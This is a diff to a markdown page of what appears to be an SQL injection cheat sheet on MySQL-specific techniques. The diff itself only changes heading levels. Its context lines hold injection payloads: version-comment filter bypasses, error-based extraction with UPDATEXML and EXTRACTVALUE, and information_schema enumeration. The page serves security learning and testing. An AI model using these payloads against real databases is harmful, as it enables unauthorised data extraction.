@@ -7,11 +7,9 @@ tags: ["mysql specific", "special syntax", "version compatibility"]
 lastUpdated: 2025-03-15
 ---
 
-## MySQL-specific Code
-
 MySQL provides several unique syntax features and functions that can be leveraged in SQL injection attacks. Understanding these MySQL-specific techniques can help bypass filters and execute complex injections.
 
-### Version-Specific Comments
+## Version-Specific Comments
 
 MySQL supports a special comment syntax that executes code only on specific versions:
 
@@ -21,7 +19,7 @@ MySQL supports a special comment syntax that executes code only on specific vers
 
 This will execute `SELECT * FROM users` only on MySQL version 5.0.0 and higher.
 
-### Examples
+## Examples
 
 ```sql
 -- This executes on MySQL 5.5 and later
@@ -36,7 +34,7 @@ SELECT /*!32302 1/0, */ 1 FROM dual
 -- If MySQL >= 3.23.02, error (division by zero)
 ```
 
-### Version Branching with UNION
+## Version Branching with UNION
 
 Use version-specific comments to create payloads that work across different MySQL versions:
 
@@ -61,7 +59,7 @@ SELECT 1 FROM dual WHERE 1=0 /*!50094 OR 1=1*/
 
 This technique allows a single payload to adapt to different MySQL versions, useful when the exact version is unknown.
 
-### MySQL-specific Functions
+## MySQL-specific Functions
 
 MySQL offers unique functions not available in other database systems:
 
@@ -74,7 +72,7 @@ MySQL offers unique functions not available in other database systems:
 | `POLYGON()`       | Geometric function that can crash some MySQL versions           |
 | `WEIGHT_STRING()` | Returns the weight string for a string                          |
 
-### Error-based Extraction Using MySQL Functions
+## Error-based Extraction Using MySQL Functions
 
 ```sql
 -- Using UPDATEXML to extract data via errors
@@ -84,7 +82,7 @@ AND UPDATEXML(1,CONCAT('~',(SELECT @@version),'~'),1)
 AND EXTRACTVALUE(1,CONCAT('~',(SELECT database()),'~'))
 ```
 
-### MySQL-specific Variables
+## MySQL-specific Variables
 
 MySQL provides system variables prefixed with `@@`:
 
@@ -98,7 +96,7 @@ SELECT @@hostname      -- Server hostname
 SELECT @@tmpdir        -- Temporary directory
 ```
 
-### MySQL Type Conversions
+## MySQL Type Conversions
 
 MySQL's automatic type conversion can be exploited:
 
@@ -112,7 +110,7 @@ SELECT 1+'true'  -- Returns 2
 SELECT 1+'false' -- Returns 1
 ```
 
-### MySQL UNION Behavior
+## MySQL UNION Behavior
 
 MySQL's UNION behavior has some unique characteristics:
 
@@ -124,7 +122,7 @@ SELECT 'string' UNION SELECT 1;  -- Works in MySQL
 SELECT GROUP_CONCAT(id) FROM users;
 ```
 
-### MySQL CHAR Function
+## MySQL CHAR Function
 
 Use CHAR to create strings from ASCII values, useful for bypassing filters:
 
@@ -133,7 +131,7 @@ Use CHAR to create strings from ASCII values, useful for bypassing filters:
 SELECT CHAR(114, 111, 111, 116);
 ```
 
-### MySQL Special Features
+## MySQL Special Features
 
 Other MySQL-specific features useful in injection:
 
@@ -150,7 +148,7 @@ EXECUTE stmt;
 DECLARE CONTINUE HANDLER FOR SQLSTATE '23000' SET @x = 1;
 ```
 
-### MySQL Information Tables
+## MySQL Information Tables
 
 MySQL's information_schema database provides a wealth of metadata:
 
@@ -165,7 +163,7 @@ SELECT column_name FROM information_schema.columns WHERE table_name = 'users'
 SELECT schema_name FROM information_schema.schemata
 ```
 
-### MySQL Specific Injection Techniques
+## MySQL Specific Injection Techniques
 
 ```sql
 -- Subquery as table
@@ -178,7 +176,7 @@ SELECT 1+1 FROM dual;
 SELECT 1 a, 2 b FROM dual;
 ```
 
-### Version-specific Limitations and Features
+## Version-specific Limitations and Features
 
 ```sql
 -- GROUP_CONCAT limited to 1024 characters by default in older versions
@@ -188,7 +186,7 @@ SELECT @@group_concat_max_len;  -- Check current limit
 SELECT JSON_EXTRACT('{"id": 1}', '$.id');  -- Only works in 5.7+
 ```
 
-### Practical Applications
+## Practical Applications
 
 Using MySQL-specific features can help in:
 
